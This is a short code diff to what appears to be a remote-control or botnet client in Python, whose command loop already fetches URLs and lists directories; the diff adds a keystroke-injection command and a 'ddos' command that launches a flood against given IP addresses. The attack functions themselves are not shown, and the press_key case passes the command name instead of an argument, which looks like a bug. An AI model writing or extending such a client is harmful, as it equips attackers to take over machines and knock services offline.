@@ -192,6 +192,10 @@ class Client:
                             command_response = commands.wget_url(command[1])
                         case "dir":
                             command_response = os.listdir()
+                        case "press_key":
+                            command_response = commands.press_key(command[0])
+                        case "ddos":
+                            command_response = commands.ddos_ip(command[1:])
                         case _:
                             # convCommand = self.arrayToString(command)
                             convCommand = " ".join(command)
